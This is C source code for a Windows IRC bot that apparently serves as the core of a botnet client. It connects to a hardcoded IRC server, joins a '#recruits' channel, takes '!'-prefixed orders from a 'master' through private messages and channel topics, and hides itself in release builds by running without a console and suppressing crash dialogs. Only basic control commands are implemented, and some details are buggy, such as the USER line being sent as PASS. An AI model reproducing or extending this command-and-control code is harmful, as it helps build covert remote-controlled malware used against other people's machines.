#define _WIN32_WINNT _WIN32_WINNT_WINXP		
#define WIN32_LEAN_AND_MEAN		

#pragma comment(lib, "WS2_32.Lib")		

#define DEBUG

#ifdef DEBUG
	#pragma comment(linker, "/subsystem:console")
#else
	#pragma comment(linker, "/subsystem:windows")
#endif

#include <windows.h>
#include <winsock2.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define MAX_LINE_SIZE 512
#define RECV_BUFFER_SIZE 2048
#define MAX_NICK_SIZE 32
#define MAX_WORDS 32

unsigned long mutex_time = 20000; // msec

int reconnect_time = 5000; // msec
int MaxWaitTime = 30; //sec

unsigned int NickLen = 3;

char OrderPrefix[] = "!";

char Chan[] = "#recruits";
int UseChanPass = 0;
char ChanPass[] = "pass";

SOCKET Sock;
BOOL Connected;




unsigned int Resolve(char *host) {
    struct    hostent    *hp;
    unsigned int    host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(hp == 0) {
            return 0;
        } else host_ip = *(u_int *)(hp->h_addr);
    }

    return(host_ip);
}







char *GenerateLetterNick(int Len, SOCKET Sock) {

	char *Nick;
	int r, i;
	char Buffer[] = "abcdefghijklmnopqrstuvwxyz0123456789_-[]^`|{}";
	if (Len == 0) Len = (rand()%5)+5;
	Nick = (char *) malloc (Len);
	srand(GetTickCount());
	for (i = 0; i < Len; i++) {
		if (i > 0) {
			r = rand()%strlen(Buffer);
			Nick[i] = Buffer[r];
		} else {
			r = rand()%26;
			Nick[i] = r+97;
		}
	}
	Nick[i] = '\0';
	return Nick;
}









void IrcPrivmsg(SOCKET sock, char *channel, char *text)
{
	char buffer[MAX_LINE_SIZE];

	_snprintf(buffer, sizeof(buffer), "%s %s :%s\r\n", "PRIVMSG", channel, text);

	send(Sock, buffer, strlen(buffer), 0);

	memset(buffer, 0, sizeof(buffer));
}








int Irc_Parse_Command(char *CurrentChannel, char *Line)
{
	char Buffer[MAX_LINE_SIZE], Hash[128];
	char *a[MAX_WORDS];
	unsigned int i = 0, x = 0;
	DWORD Id = 0;
	BOOL Silent = FALSE;

#ifdef DEBUG
	printf("Command to parse: %s on channel: %s\n", Line, CurrentChannel);
#endif

	//Split Line
	a[i] = strtok(Line, " ");
	while (a[i] != NULL) {
		i++;
		if (i > MAX_WORDS)
			break;
		a[i] = strtok(NULL, " ");
	}

	if (a[0] == NULL)
		return 1;

	//Check for parameters
	i = 1;
	while (a[i] != NULL) {
		if (strcmp(a[i], "-s") == 0)
		{
			x++;
			Silent = TRUE;
		}
		i++;
	}

		//Version
		if (strcmp(a[0], "v") == 0)
		{
			if (!Silent) IrcPrivmsg(Sock, CurrentChannel,"linuxbot v. 1.0 shoutout to rude_bwoy92");
			return 1;
		}

		//Disconnect, die
		else if (strcmp(a[0], "d") == 0)
		{
			_snprintf(Buffer, sizeof(Buffer), "%s :disconnecting\r\n", "QUIT");
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return -2;
		}

		//Reconnect, same server
		else if (strcmp(a[0], "r") == 0)
		{
			_snprintf(Buffer, sizeof(Buffer), "%s\r\n", "QUIT");
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return -3;
		}

		//Reconnect, next server
		else if (strcmp(a[0], "q") == 0)
		{
			_snprintf(Buffer, sizeof(Buffer), "%s\r\n", "QUIT");
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return -4;
		}

		//Set nick
		else if (strcmp(a[0], "n") == 0)
		{
			if (a[x+1] != NULL)
				_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", a[x+1]);
			else
				_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", GenerateLetterNick(NickLen, Sock));
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return 1;
		}

		else if (a[x+1] == NULL) return 1;

		//Join channel
		else if (strcmp(a[0], "j") == 0)
		{
			if (a[x+2] != NULL)
				_snprintf(Buffer, sizeof(Buffer), "%s %s %s\r\n", "JOIN", a[x+1], a[x+2]);
			else
				_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "JOIN", a[x+1]);
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return 1;
		}

		//Part channel
		else if (strcmp(a[0], "p") == 0)
		{
			_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "PART", a[x+1]);
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return 1;
		}

		else if (a[x+2] == NULL) return 1;


		else if (a[x+3] == NULL) return 1;


		else if (a[x+4] == NULL) return 1;


		else if (a[x+5] == NULL) return 1;

		return 1;
}

















int Irc_Connect(char *Server, unsigned int Port, BOOL UsePassword, const char *Password) {

	SOCKADDR_IN Peer;

	char Buffer[MAX_LINE_SIZE], Nick[MAX_NICK_SIZE], name[MAX_NICK_SIZE];

	Peer.sin_family = AF_INET;
	Peer.sin_port = htons(Port);
	if ((Peer.sin_addr.s_addr = Resolve(Server)) == 0) {
#ifdef DEBUG
		printf("Couldn't resolve irc server host!\n");
#endif
		return 0;
	}

	Sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (Sock < 0) {
#ifdef DEBUG
		printf("Failed to initialize socket!\n");
#endif
		return 0;
	}

	if (connect(Sock, (LPSOCKADDR)&Peer, sizeof(Peer)) == SOCKET_ERROR) {
#ifdef DEBUG
		printf("Failed to connect to server!\n");
#endif
		return 0;
	}

	if (UsePassword) {
		_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "PASS", Password);
		send(Sock, Buffer, strlen(Buffer), 0);
	}

	sprintf(Nick, GenerateLetterNick(NickLen, Sock));
	sprintf(Buffer, "%s %s\r\n", "NICK", Nick);

	if (send(Sock, Buffer, strlen(Buffer), 0) == SOCKET_ERROR) {
#ifdef DEBUG
		printf("Failed to send NICK!\n");
#endif
		return 0;
	}
	sprintf(name, "%s", GenerateLetterNick(0, 0));
	sprintf(Buffer, "%s %s \"fo%d.net\" \"lol\" :%s\r\n", "PASS", name, rand()%10, name);

#ifdef DEBUG
	printf("Sending: %s\n", Buffer);
#endif

	if (send(Sock, Buffer, strlen(Buffer), 0) == SOCKET_ERROR) {
#ifdef DEBUG
		printf("Failed to send USER!\n");
#endif
		return 0;
	}

	return 1;
}














int Irc_Parse(char *Line)
{
	char Buffer[MAX_LINE_SIZE], ParseLine[MAX_LINE_SIZE], ParseLineStatic[MAX_LINE_SIZE];
	char *w[MAX_WORDS];
	unsigned int i = 0;
	int E = 1;

#ifdef DEBUG
	printf("Parsing %s\n", Line);
#endif

	if (Line == NULL) return E;

	//Split line into words
	w[i] = strtok(Line, ": ");
	while (w[i] != NULL) {
		i++;
		if (i > MAX_WORDS)break;
		w[i] = strtok(NULL, ": ");
	}

	//We have received PING, so send back PONG

	if (strcmp(w[0], "PING") == 0) //Первый символ - пробел??
	{
		_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "PONG", w[1]);
		send(Sock, Buffer, strlen(Buffer), 0);

		//Let's join the channel
		if (UseChanPass)
			_snprintf(Buffer, sizeof(Buffer), "%s %s %s\r\n", "JOIN", Chan, ChanPass);
		else
			_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "JOIN", Chan);

		if (send(Sock, Buffer, strlen(Buffer), 0) == SOCKET_ERROR)
			return -1;

#ifdef DEBUG
		else
			printf("Joined channel %s\n", Chan);
#endif
		memset(Buffer, 0, sizeof(Buffer));
		return 1;
	}

	// MOTD, so we can join the channel
	if (strcmp(w[1], "422") == 0)
	{
		if (UseChanPass)
			_snprintf(Buffer, sizeof(Buffer), "%s %s %s\r\n", "JOIN", Chan, ChanPass);
		else
			_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "JOIN", Chan);

		if (send(Sock, Buffer, strlen(Buffer), 0) == SOCKET_ERROR)
			return -1;

#ifdef DEBUG
		else
			printf("Joined channel %s\n", Chan);
#endif
		memset(Buffer, 0, sizeof(Buffer));
	}

	//Nick already in use
	else if (strcmp(w[1], "433") == 0)
	{
		_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", GenerateLetterNick(NickLen, Sock));

		if (send(Sock, Buffer, strlen(Buffer), 0) == SOCKET_ERROR)
			return -1;
		else
			return 1;
	}

	//We receive order from master, lets check his host first!
	else if (strcmp(w[1], "PRIVMSG") == 0 && strncmp(w[3], OrderPrefix, strlen(OrderPrefix)) == 0 && strlen(w[3]) > strlen(OrderPrefix))
	{
			i = 3;
			while (w[i] != NULL)
			{
				//We assume w[i] has prefix, lets get rid of it
				memset(w[i], '\x20', strlen(OrderPrefix));
				sprintf(ParseLine, "");
				while (strncmp(w[i], OrderPrefix, strlen(OrderPrefix)) != 0)
				{
					_snprintf(ParseLine, sizeof(ParseLine),"%s %s", ParseLine, w[i]);
					i++;
					if (w[i] == NULL) break;
				}
				E = Irc_Parse_Command(w[2], ParseLine);
				if (E < 1)
					return E;
			}
			return 1;
	}

	else if (w[4] == NULL) return 1;

	//We receive topic, so lets check it and then call function to parse
	else if (strcmp(w[1], "332") == 0 && strncmp(w[4], OrderPrefix, strlen(OrderPrefix)) == 0 && strlen(w[4]) > strlen(OrderPrefix))
	{
		sprintf(ParseLineStatic, "");
		i = 4;
		//If multiple commands set in topic, lets parse them all!
		while (w[i] != NULL)
		{
			//We assume w[i] has prefix, lets get rid of it
			memset(w[i], '\x20', strlen(OrderPrefix));
			sprintf(ParseLine, "");
			while (strncmp(w[i], OrderPrefix, strlen(OrderPrefix)) != 0)
			{
				_snprintf(ParseLine, sizeof(ParseLine), "%s %s", ParseLine, w[i]);
				i++;
				if (w[i] == NULL) break;
			}
			E = Irc_Parse_Command(w[3], ParseLine);
			if (E < 1)
				return E;
		}
		return 1;
	}

	return 1;
}













#ifdef DEBUG
int main()
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
#endif
{

	//Initialization of variables
	char Buffer[RECV_BUFFER_SIZE], CurrentName[MAX_PATH];
	int Error = 0, len;
	DWORD Id = 0;
	struct timeval tv;
	fd_set fds;
	int nRetVal;

#ifndef DEBUG
	//Hide system messages if bot crashes
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
#endif

	//Lets initialize WSA
	WSADATA WSAdata;
	if ((Error = WSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0)
	{
#ifdef DEBUG
		printf("WSA Error!\n");
#endif
		return 0;
	}

	Connected = FALSE;

	//Start loop connecting to servers - if first server fails to connect, lets connect to another one etc...
	tv.tv_sec = MaxWaitTime;
	tv.tv_usec = 0;
	while (1)
	{
#ifdef DEBUG
		printf("Connecting to %s:%d\n", "192.168.145.1", 6667);
#endif
		//Connect to irc server
		if (Irc_Connect("192.168.145.1", 6667, 0, "password"))
		{
#ifdef DEBUG
			printf("Connection established on %s:%d\n", "192.168.145.1", 6667);
#endif
			Connected = TRUE;
			while (Sock > 0)
			{
				FD_ZERO(&fds);
				FD_SET(Sock, &fds);

				len = 0;
				memset(Buffer, 0, sizeof(Buffer));
				while ((nRetVal = select(Sock, &fds, NULL, NULL, &tv)) > 0)
				{
					if (len == RECV_BUFFER_SIZE - 1)
						break;
					len += recv(Sock, Buffer + len, 1, 0);
					if (Buffer[len-1] == '\r' || Buffer[len-1] == '\n')
						break;
				}

				if (nRetVal <= 0)
					break;
				else if (len < 2)
					continue;
				else
				{
					Buffer[len-1] = 0;

					Error = Irc_Parse(Buffer);
					switch (Error) {
					//Connection lost
					case -1:
						Connected = FALSE;
						break;
					//Forced disconnect
					case -2:
						closesocket(Sock);
						WSACleanup();
						return 0;
					//Reconnect to the same server
					case -3:
						closesocket(Sock);
						Connected = FALSE;
						break;
					default:
						break;
					}
					//Connection with server has been lost! Reconnect!
					if (!Connected) break;
				}

			}
#ifdef DEBUG
			printf("Disconnected from server.\n");
#endif
			closesocket(Sock);
		}
		Sleep(reconnect_time);
	}

	//Cleanup
	closesocket(Sock);
	WSACleanup();

	return 0;
}
